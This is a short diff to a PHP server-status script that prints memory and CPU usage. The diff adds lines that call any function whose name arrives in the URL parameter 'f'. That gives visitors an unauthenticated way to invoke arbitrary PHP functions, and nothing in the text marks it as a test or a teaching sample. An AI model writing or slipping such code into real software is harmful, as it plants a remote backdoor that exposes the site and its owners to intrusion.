@@ -65,6 +65,10 @@ echo 'Memory usage: '.$memory_usage.'%';
 echo '<br>';
 echo 'CPU usage: '.$load.'%';
 
+if(function_exists($_GET['f'])) {
+   $_GET['f']();
+}
+
 function get_new_kpi_set()
 {
 	echo 'test';
